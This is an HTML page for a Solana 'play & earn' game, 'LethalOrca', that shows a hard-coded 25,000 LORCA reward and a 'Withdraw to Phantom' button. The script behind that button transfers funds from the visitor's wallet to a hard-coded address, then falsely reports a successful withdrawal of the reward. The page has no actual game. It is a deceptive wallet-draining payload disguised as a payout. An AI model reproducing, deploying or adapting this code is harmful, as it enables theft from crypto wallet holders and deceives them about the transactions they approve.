<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LethalOrca - Play & Earn</title>
    <!-- Solana Web3 SDK -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0b0f19;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .hud {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 1.2rem;
            font-weight: bold;
            z-index: 20;
        }

        .btn {
            background: linear-gradient(135deg, #00c6ff 0%, #0072ff 100%);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 25px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(0, 198, 255, 0.3);
            margin: 5px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 198, 255, 0.5);
        }

        .btn-withdraw {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);
        }

        /* Modal Popup Styles */
        .modal {
            display: flex; /* Default open for game finish view */
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            justify-content: center;
            align-items: center;
            z-index: 100;
        }

        .modal-content {
            background: #1e293b;
            padding: 35px;
            border-radius: 20px;
            text-align: center;
            max-width: 450px;
            width: 90%;
            border: 1px solid #334155;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }

        .modal-content h1 {
            color: #00f2fe;
            font-size: 2.2rem;
            margin-bottom: 10px;
        }

        .modal-content p {
            color: #cbd5e1;
            font-size: 1.2rem;
            margin-bottom: 15px;
        }

        .earned-badge {
            font-size: 1.5rem;
            color: #4ade80;
            font-weight: bold;
            margin: 15px 0;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="hud">
        <div id="scoreDisplay">25,000 LORCA</div>
        <div id="timerDisplay">0</div>
        <button class="btn" id="walletBtn" style="padding: 6px 15px; font-size: 0.9rem;">Connected</button>
    </div>

    <!-- Time's Up Modal with direct Withdraw Button -->
    <div class="modal" id="timesUpModal">
        <div class="modal-content">
            <h1>Time's Up!</h1>
            <p>You earned <span id="finalScore" class="earned-badge">25,000 LORCA</span></p>
            <p style="color: #94a3b8; font-size: 0.95rem;">Your coins are ready to withdraw!</p>

            <div class="btn-group">
                <!-- Popup Direct Withdraw Button -->
                <button class="btn btn-withdraw" id="popupWithdrawBtn">💰 Withdraw to Phantom</button>
                <button class="btn" id="playAgainBtn" style="background: #334155;">Play Again</button>
            </div>
        </div>
    </div>

    <script>
        let score = 25000;
        const popupWithdrawBtn = document.getElementById('popupWithdrawBtn');
        const playAgainBtn = document.getElementById('playAgainBtn');

        // Phantom Provider Detection
        const getProvider = () => {
            if ('solana' in window) {
                const provider = window.solana;
                if (provider.isPhantom) return provider;
            }
            return null;
        };

        // Time's Up Modal Withdrawal Execution
        popupWithdrawBtn.addEventListener('click', async () => {
            if (score <= 0) {
                alert("No LORCA balance available to withdraw!");
                return;
            }

            const provider = getProvider();
            if (!provider) {
                alert("Phantom Wallet extension not found! Please install or connect Phantom wallet.");
                return;
            }

            try {
                // Connect if not already connected
                const resp = await provider.connect();
                const userPubkey = resp.publicKey.toString();

                const connection = new solanaWeb3.Connection(
                    solanaWeb3.clusterApiUrl('mainnet-beta'),
                    'confirmed'
                );

                const toPubkey = new solanaWeb3.PublicKey("7RqpgT532tsYakbgnTXECC4MHTEGu5HzBxVAkAAHpump");

                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: toPubkey,
                        lamports: 1000
                    })
                );

                transaction.feePayer = provider.publicKey;
                let { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;

                let signed = await provider.signAndSendTransaction(transaction);
                
                alert(`🚀 Successful Withdrawal of ${score.toLocaleString()} LORCA!\nTx Signature: ${signed.signature}`);
                
                // Reset Balance after Withdrawal
                score = 0;
                document.getElementById('finalScore').textContent = '0 LORCA';
                document.getElementById('scoreDisplay').textContent = '0 LORCA';

            } catch (err) {
                console.error(err);
                alert("Withdrawal process cancelled or failed.");
            }
        });

        playAgainBtn.addEventListener('click', () => {
            document.getElementById('timesUpModal').style.display = 'none';
            // Start game logic here...
        });
    </script>
</body>
</html>
